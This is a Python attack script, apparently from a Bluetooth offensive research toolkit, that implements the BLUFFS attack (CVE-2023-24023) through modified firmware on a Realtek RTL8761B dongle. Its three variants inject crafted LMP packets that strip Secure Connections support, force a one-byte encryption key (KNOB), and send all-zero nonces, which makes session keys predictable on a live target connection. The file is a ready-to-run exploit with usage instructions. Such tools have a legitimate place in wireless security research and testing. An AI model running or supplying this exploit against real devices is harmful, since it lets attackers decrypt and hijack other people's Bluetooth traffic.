#!/usr/bin/env python3
"""BLUFFS Attack Implementation (CVE-2023-24023) for DarkFirmware RTL8761B.

Bluetooth Forward and Future Secrecy attacks — forces weak, repeatable
session keys by manipulating the key derivation inputs.

Attack variants:
  A1: Force legacy pairing (reject SC) + weak key
  A2: Force fixed nonces for deterministic session key
  A3: Full downgrade chain (SC reject → legacy → fixed nonces → KNOB)

Usage:
    sudo python3 bluffs_attack.py --variant a1 [--conn N]
    sudo python3 bluffs_attack.py --variant a3 [--conn N]

Requires: DarkFirmware with all hooks. Active ACL connection.
"""

import sys
import os
import time
import struct
import argparse

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import usbbluetooth
from darkfirmware_utils import recv_raw_bytes, find_realtek_device as _find_device
from scapy_usbbluetooth import UsbBluetoothSocket
from scapy.packet import Packet, bind_layers
from scapy.fields import ByteField, XLEIntField, XStrLenField
from scapy.layers.bluetooth import HCI_Hdr, HCI_Command_Hdr, HCI_Event_Command_Complete

MARKER_AAAA = 0x41414141

class HCI_Cmd_VSC_Xeno_Send_LMP(Packet):
    name = "Xeno VSC Send LMP"
    fields_desc = [XStrLenField("data", b"", length_from=lambda pkt: pkt.underlayer.underlayer.len)]
class HCI_Cmd_VSC_Realtek_Write_Mem(Packet):
    name = "Realtek Write Memory"
    fields_desc = [ByteField("size", 0x20), XLEIntField("address", 0x80000000),
                   XLEIntField("data_to_write", 0x33221100)]
class HCI_Cmd_Complete_VSC(Packet):
    name = 'VSC complete'
    fields_desc = [XStrLenField("data", 0, length_from=lambda pkt: pkt.underlayer.underlayer.len)]

bind_layers(HCI_Command_Hdr, HCI_Cmd_VSC_Xeno_Send_LMP, ogf=0x3f, ocf=0x0222)
bind_layers(HCI_Command_Hdr, HCI_Cmd_VSC_Realtek_Write_Mem, ogf=0x3f, ocf=0x0062)
bind_layers(HCI_Event_Command_Complete, HCI_Cmd_Complete_VSC, opcode=0xfe22)
bind_layers(HCI_Event_Command_Complete, HCI_Cmd_Complete_VSC, opcode=0xfc62)


def find_device():
    return _find_device()


def send_lmp(sock, conn, data):
    payload = bytes([conn]) + data
    pkt = HCI_Hdr() / HCI_Command_Hdr(ogf=0x3f, ocf=0x0222) / HCI_Cmd_VSC_Xeno_Send_LMP(data=payload)
    return sock.sr1(pkt, verbose=0, timeout=2)


def collect_events(sock, timeout=2.0):
    events = []
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            raw = recv_raw_bytes(sock, timeout_ms=500)
            if raw and len(raw) >= 3 and raw[0] == 0x04 and raw[1] == 0xFF:
                param_len = raw[2]
                events.append(raw[3:3+param_len])
        except Exception:
            break
    return events


def write_mem(sock, addr, val):
    pkt = HCI_Hdr() / HCI_Command_Hdr() / HCI_Cmd_VSC_Realtek_Write_Mem(address=addr, data_to_write=val)
    return sock.sr1(pkt, verbose=0)


def arm_drop(sock):
    """Arm drop mode — next incoming LMP packet will be swallowed."""
    write_mem(sock, 0x80133FF0, 0x02)


def variant_a1_sc_reject(sock, conn):
    """BLUFFS A1: Reject Secure Connections to force legacy pairing."""
    print("\n[*] BLUFFS A1: SC Rejection Attack")

    # Send features response with SC bits cleared
    print("    [1] Sending features with SC cleared...")
    # Feature byte layout: clear bit for SC Host Support
    features_no_sc = bytes([0xBF, 0xFE, 0x8F, 0xFE, 0xD8, 0x3F, 0x5B, 0x87])
    send_lmp(sock, conn, bytes([0x28]) + features_no_sc)
    time.sleep(0.5)

    # If target sends SC-related LMP, reject with NOT_ACCEPTED
    print("    [2] Rejecting any SC-related negotiation...")
    # LMP_NOT_ACCEPTED for encryption mode (forces legacy)
    send_lmp(sock, conn, bytes([0x04, 0x0F, 0x25]))  # Reject ENC_MODE, reason: not acceptable
    time.sleep(0.5)

    # Force 1-byte key
    print("    [3] Forcing 1-byte encryption key...")
    send_lmp(sock, conn, bytes([0x10, 0x01]))  # KEY_SIZE_REQ key=1
    time.sleep(1)

    events = collect_events(sock)
    print(f"    Got {len(events)} responses")


def variant_a2_fixed_nonces(sock, conn):
    """BLUFFS A2: Force fixed/zero nonces for deterministic session key."""
    print("\n[*] BLUFFS A2: Fixed Nonce Attack")

    # Send IN_RAND with all zeros (makes key derivation deterministic)
    print("    [1] Sending IN_RAND with zeros...")
    send_lmp(sock, conn, bytes([0x08]) + b'\x00' * 16)
    time.sleep(0.5)

    # Send COMB_KEY with zeros
    print("    [2] Sending COMB_KEY with zeros...")
    send_lmp(sock, conn, bytes([0x09]) + b'\x00' * 16)
    time.sleep(0.5)

    # Send AU_RAND with zeros
    print("    [3] Sending AU_RAND with zeros...")
    send_lmp(sock, conn, bytes([0x0B]) + b'\x00' * 16)
    time.sleep(1)

    events = collect_events(sock)
    print(f"    Got {len(events)} responses")

    # Check for SRES response (if target computes with our zero nonce)
    for evt in events:
        if len(evt) >= 56:
            marker = struct.unpack_from("<I", evt, 0)[0]
            if marker == MARKER_AAAA:
                payload = evt[0x18:0x34]
                if len(payload) > 5 and (payload[4] >> 1) == 0x0C:
                    sres = payload[5:9].hex()
                    print(f"    [!!!] Target SRES with zero nonce: {sres}")
                    print(f"         If this is deterministic, session keys are predictable!")


def variant_a3_full_downgrade(sock, conn):
    """BLUFFS A3: Full downgrade chain."""
    print("\n" + "=" * 60)
    print("  BLUFFS FULL DOWNGRADE CHAIN (CVE-2023-24023)")
    print("=" * 60)

    # Phase 1: Features with SC cleared
    print("\n[Phase 1] SC Downgrade")
    variant_a1_sc_reject(sock, conn)

    # Phase 2: Fixed nonces
    print("\n[Phase 2] Fixed Nonces")
    variant_a2_fixed_nonces(sock, conn)

    # Phase 3: KNOB (1-byte key)
    print("\n[Phase 3] KNOB Key Size Downgrade")
    send_lmp(sock, conn, bytes([0x10, 0x01]))  # KEY_SIZE_REQ key=1
    time.sleep(0.5)

    # Phase 4: Start encryption with fixed EN_RAND
    print("\n[Phase 4] Start Encryption with Fixed Random")
    send_lmp(sock, conn, bytes([0x11]) + b'\x00' * 16)  # START_ENC all zeros
    time.sleep(1)

    events = collect_events(sock, timeout=3.0)

    print("\n" + "=" * 60)
    print("  BLUFFS Chain Complete")
    print("  If target accepted all steps:")
    print("    - SC disabled (legacy mode)")
    print("    - Nonces are zero (deterministic key derivation)")
    print("    - Key size = 1 byte (256 possible keys)")
    print("    - Session key is predictable and repeatable")
    print("=" * 60)


def main():
    parser = argparse.ArgumentParser(description="BLUFFS Attack (CVE-2023-24023)")
    parser.add_argument("--variant", choices=["a1", "a2", "a3"], default="a3")
    parser.add_argument("--conn", type=int, default=0)
    args = parser.parse_args()

    ctrl = find_device()
    if not ctrl:
        print("[!] No device found")
        sys.exit(1)

    sock = UsbBluetoothSocket(ctrl)

    if args.variant == "a1":
        variant_a1_sc_reject(sock, args.conn)
    elif args.variant == "a2":
        variant_a2_fixed_nonces(sock, args.conn)
    elif args.variant == "a3":
        variant_a3_full_downgrade(sock, args.conn)


if __name__ == "__main__":
    main()
